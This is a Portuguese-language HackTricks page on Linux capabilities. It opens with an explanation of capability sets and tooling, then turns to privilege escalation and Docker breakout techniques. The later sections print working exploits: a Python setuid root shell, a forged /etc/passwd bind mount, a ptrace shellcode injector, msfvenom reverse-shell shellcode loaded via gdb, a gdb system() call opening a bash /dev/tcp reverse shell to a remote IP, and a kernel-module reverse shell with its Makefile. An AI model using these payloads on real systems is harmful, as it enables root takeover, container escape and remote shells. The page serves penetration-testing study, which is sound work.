# Capacidades do Linux

{{#include ../../banners/hacktricks-training.md}}


## Capacidades do Linux

As capabilities do Linux dividem os **privilégios de root em unidades menores e distintas**, permitindo que os processos tenham um subconjunto de privilégios. Isso minimiza os riscos ao não conceder privilégios completos de root desnecessariamente.

### O problema:

- Usuários normais têm permissões limitadas, afetando tarefas como abrir um socket de rede, o que requer acesso de root.

### Conjuntos de capabilities:

1. **Inherited (CapInh)**:

- **Objetivo**: Determina as capabilities transmitidas pelo processo pai.
- **Funcionalidade**: Quando um novo processo é criado, ele herda as capabilities do processo pai nesse conjunto. É útil para manter certos privilégios durante a criação de processos.
- **Restrições**: Um processo não pode obter capabilities que seu processo pai não possuía.

2. **Effective (CapEff)**:

- **Objetivo**: Representa as capabilities que um processo está utilizando em determinado momento.
- **Funcionalidade**: É o conjunto verificado pelo kernel para conceder permissão para várias operações. Para arquivos, esse conjunto pode ser um sinalizador que indica se as capabilities permitidas do arquivo devem ser consideradas efetivas.
- **Importância**: O conjunto efetivo é crucial para as verificações imediatas de privilégios, atuando como o conjunto ativo de capabilities que um processo pode usar.

3. **Permitted (CapPrm)**:

- **Objetivo**: Define o conjunto máximo de capabilities que um processo pode possuir.
- **Funcionalidade**: Um processo pode elevar uma capability do conjunto permitido para seu conjunto efetivo, obtendo a capacidade de usá-la. Ele também pode remover capabilities de seu conjunto permitido.
- **Limite**: Atua como um limite superior para as capabilities que um processo pode ter, garantindo que um processo não exceda seu escopo de privilégios predefinido.

4. **Bounding (CapBnd)**:

- **Objetivo**: Estabelece um teto para as capabilities que um processo pode adquirir durante seu ciclo de vida.
- **Funcionalidade**: Mesmo que um processo tenha determinada capability em seu conjunto herdável ou permitido, ele não poderá adquiri-la a menos que ela também esteja no conjunto bounding.
- **Caso de uso**: Esse conjunto é particularmente útil para restringir o potencial de privilege escalation de um processo, adicionando uma camada extra de segurança.

5. **Ambient (CapAmb)**:
- **Objetivo**: Permite que determinadas capabilities sejam mantidas durante uma chamada de sistema `execve`, que normalmente resultaria em uma redefinição completa das capabilities do processo.
- **Funcionalidade**: Garante que programas que não sejam SUID e não tenham capabilities de arquivo associadas possam manter determinados privilégios.
- **Restrições**: As capabilities desse conjunto estão sujeitas às restrições dos conjuntos herdável e permitido, garantindo que não excedam os privilégios permitidos ao processo.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Para obter mais informações, consulte:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capabilities de Processos e Binaries

### Capabilities de Processos

Para ver as capabilities de um processo específico, use o arquivo **status** no diretório /proc. Como ele fornece mais detalhes, vamos limitar as informações apenas ao que está relacionado às capabilities do Linux.\
Observe que, para todos os processos em execução, as informações de capabilities são mantidas por thread; para os binaries no sistema de arquivos, elas são armazenadas em atributos estendidos.

Você pode encontrar as capabilities definidas em /usr/include/linux/capability.h

Você pode encontrar as capabilities do processo atual usando `cat /proc/self/status` ou executando `capsh --print`, e as de outros usuários em `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Este comando deve retornar 5 linhas na maioria dos sistemas.

- CapInh = Capabilities herdadas
- CapPrm = Capabilities permitidas
- CapEff = Capabilities efetivas
- CapBnd = Bounding set
- CapAmb = Conjunto de capabilities Ambient
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Esses números hexadecimais não fazem sentido. Usando o utilitário capsh, podemos decodificá-los para obter os nomes das capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Vamos verificar agora as **capabilities** usadas pelo `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Embora isso funcione, há outra maneira mais fácil. Para ver as capabilities de um processo em execução, basta usar a ferramenta **getpcaps** seguida pelo ID do processo (PID). Você também pode fornecer uma lista de IDs de processos.
```bash
getpcaps 1234
```
Vamos verificar aqui as capabilities do `tcpdump` depois de atribuir ao binário capabilities suficientes (`cap_net_admin` e `cap_net_raw`) para farejar a rede (_o tcpdump está sendo executado no processo 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Como você pode ver, as capabilities fornecidas correspondem aos resultados das 2 formas de obter as capabilities de um binary.\
A ferramenta _getpcaps_ usa a system call **capget()** para consultar as capabilities disponíveis para uma thread específica. Essa system call precisa apenas do PID para obter mais informações.

### Capabilities de Binaries

Binaries podem ter capabilities que podem ser usadas durante a execução. Por exemplo, é muito comum encontrar o binary `ping` com a capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Você pode **pesquisar binários com capabilities** usando:
```bash
getcap -r / 2>/dev/null
```
### Removendo capabilities com capsh

Se removermos as capabilities CAP*NET_RAW do \_ping*, o utilitário ping não deverá mais funcionar.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Além da saída do próprio _capsh_, o próprio comando _tcpdump_ também deve gerar um erro.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

O erro mostra claramente que o comando ping não tem permissão para abrir um socket ICMP. Agora sabemos com certeza que isso funciona conforme o esperado.

### Remover Capabilities

Você pode remover capabilities de um binário com
```bash
setcap -r </path/to/binary>
```
## Capabilities de Usuário

Aparentemente, **é possível atribuir capabilities também a usuários**. Isso provavelmente significa que todos os processos executados pelo usuário poderão usar as capabilities do usuário.\
Com base [nisto](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [nisto ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)e [nisto](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), alguns arquivos precisam ser configurados para conceder determinadas capabilities a um usuário, mas o arquivo que atribui as capabilities a cada usuário será `/etc/security/capability.conf`.\
Exemplo de arquivo:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities do Ambiente

Compilar o programa a seguir permite **iniciar um shell bash dentro de um ambiente que fornece capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Dentro do **bash executado pelo binário ambient compilado**, é possível observar as **novas capabilities** (um usuário comum não terá nenhuma capability na seção "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Você **só pode adicionar capabilities presentes** tanto nos conjuntos permitidos quanto nos herdáveis.

### Binários capability-aware/capability-dumb

Os **binários capability-aware não usarão as novas capabilities** fornecidas pelo ambiente; no entanto, os **binários capability-dumb as usarão**, pois não as rejeitarão. Isso torna os binários capability-dumb vulneráveis dentro de um ambiente especial que concede capabilities aos binários.

## Capabilities de serviço

Por padrão, um **serviço executado como root terá todas as capabilities atribuídas**, e, em algumas ocasiões, isso pode ser perigoso.\
Portanto, um arquivo de **configuração do serviço** permite **especificar** as **capabilities** que você deseja que ele tenha, **e o** **usuário** que deve executar o serviço, para evitar a execução de um serviço com privilégios desnecessários:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities em Docker Containers

Por padrão, o Docker atribui algumas capabilities aos containers. É muito fácil verificar quais são essas capabilities executando:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities são úteis quando você **quer restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, depois de configurar um chroot e fazer bind em um socket). No entanto, elas podem ser exploradas passando comandos ou argumentos maliciosos que são então executados como root.

Você pode forçar capabilities em programas usando `setcap` e consultá-las usando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
O `+ep` significa que você está adicionando a capability (`-` a removeria) como Effective e Permitted.

Para identificar programas em um sistema ou pasta com capabilities:
```bash
getcap -r / 2>/dev/null
```
### Exemplo de exploração

No exemplo a seguir, o binário `/usr/bin/python2.6` é considerado vulnerável a privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** necessárias para que o `tcpdump` **permita que qualquer usuário capture pacotes**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### O caso especial das capabilities "vazias"

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Observe que é possível atribuir conjuntos de capabilities vazios a um arquivo de programa e, assim, criar um programa set-user-ID-root que altera o set-user-ID efetivo e salvo do processo que executa o programa para 0, mas não concede capabilities a esse processo. Ou, em termos simples, se você tiver um binary que:

1. não pertence ao root
2. não possui os bits `SUID`/`SGID` definidos
3. possui um conjunto de capabilities vazio (por exemplo: `getcap myelf` retorna `myelf =ep`)

então **esse binary será executado como root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** é uma capability altamente poderosa do Linux, frequentemente equiparada a um nível quase root devido aos seus extensos **privilégios administrativos**, como montar dispositivos ou manipular recursos do kernel. Embora seja indispensável para containers que simulam sistemas inteiros, **`CAP_SYS_ADMIN` apresenta desafios significativos de segurança**, especialmente em ambientes containerizados, devido ao seu potencial para privilege escalation e comprometimento do sistema. Portanto, seu uso requer avaliações rigorosas de segurança e gerenciamento cuidadoso, com forte preferência por remover essa capability de containers específicos de aplicações para seguir o **princípio do menor privilégio** e minimizar a attack surface.

**Exemplo com binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando Python, você pode montar um arquivo _passwd_ modificado sobre o arquivo _passwd_ real:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
E, por fim, faça **mount** do arquivo `passwd` modificado em `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
E você poderá fazer **`su` como root** usando a senha "password".

**Exemplo com ambiente (Docker breakout)**

Você pode verificar as capabilities habilitadas dentro do container Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro da saída anterior, você pode ver que a capability SYS_ADMIN está habilitada.

- **Mount**

Isso permite que o container do docker **monte o disco do host e o acesse livremente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Acesso total**

No método anterior, conseguimos acessar o disco do docker host.\
Caso descubra que o host está executando um servidor **ssh**, você poderia **criar um usuário dentro do disco do docker host** e acessá-lo via SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Isso significa que você pode escapar do container injetando um shellcode em algum processo em execução dentro do host.** Para acessar processos em execução dentro do host, o container precisa ser executado pelo menos com **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** concede a capacidade de usar as funcionalidades de debugging e tracing de system calls fornecidas por `ptrace(2)` e chamadas de cross-memory attach, como `process_vm_readv(2)` e `process_vm_writev(2)`. Embora seja poderoso para fins de diagnóstico e monitoramento, se `CAP_SYS_PTRACE` estiver habilitado sem medidas restritivas, como um filtro seccomp em `ptrace(2)`, ele pode comprometer significativamente a segurança do sistema. Especificamente, pode ser explorado para contornar outras restrições de segurança, principalmente aquelas impostas pelo seccomp, conforme demonstrado por [proofs of concept (PoC) como este](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Exemplo com binário (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Exemplo com binário (gdb)**

`gdb` com capacidade de `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Crie um shellcode com msfvenom para injetar na memória via gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Depure um processo root com gdb e copie e cole as linhas de gdb geradas anteriormente:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Exemplo com ambiente (escape de Docker) - Outro abuso do GDB**

Se o **GDB** estiver instalado (ou você puder instalá-lo com `apk add gdb` ou `apt install gdb`, por exemplo), poderá **depurar um processo do host** e fazê-lo chamar a função `system`. (Essa técnica também requer a capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Você não conseguirá ver a saída do comando executado, mas ele será executado por esse processo (portanto, obtenha um rev shell).

> [!WARNING]
> Se você obtiver o erro "No symbol "system" in current context.", consulte o exemplo anterior de carregamento de um shellcode em um programa via gdb.

**Exemplo com ambiente (Docker breakout) - Shellcode Injection**

Você pode verificar as capabilities habilitadas dentro do container do Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Listar **processos** em execução no **host** `ps -eaf`

1. Obter a **arquitetura** `uname -m`
2. Encontrar um **shellcode** para a arquitetura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Encontrar um **programa** para **inject** o **shellcode** na memória de um processo ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modificar** o **shellcode** dentro do programa e compilá-lo `gcc inject.c -o inject`
5. Fazer o **inject** e obter seu **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permite que um processo **carregue e descarregue módulos do kernel (chamadas de sistema `init_module(2)`, `finit_module(2)` e `delete_module(2)`)**, oferecendo acesso direto às operações principais do kernel. Essa capability apresenta riscos críticos de segurança, pois permite escalation de privilégios e comprometimento total do sistema ao possibilitar modificações no kernel, contornando todos os mecanismos de segurança do Linux, incluindo Linux Security Modules e o isolamento de containers.
**Isso significa que você pode** **inserir/remover módulos do kernel no/do kernel da máquina host.**

**Exemplo com binary**

No exemplo a seguir, o binary **`python`** possui essa capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Por padrão, o comando **`modprobe`** verifica a lista de dependências e os arquivos de mapeamento no diretório **`/lib/modules/$(uname -r)`**.\
Para explorar isso, vamos criar uma pasta **lib/modules** falsa:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Em seguida, **compile o módulo do kernel que você pode encontrar nos 2 exemplos abaixo e copie-o** para esta pasta:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Finalmente, execute o código Python necessário para carregar este módulo do kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Exemplo 2 com binário**

No exemplo a seguir, o binário **`kmod`** tem esta capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
O que significa que é possível usar o comando **`insmod`** para inserir um módulo do kernel. Siga o exemplo abaixo para obter um **reverse shell** abusando desse privilégio.

**Exemplo com ambiente (Docker breakout)**

Você pode verificar as capabilities habilitadas dentro do container do Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Na saída anterior, você pode ver que a capacidade **SYS_MODULE** está habilitada.

**Crie** o **kernel module** que executará um reverse shell e o **Makefile** para **compilá-lo**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
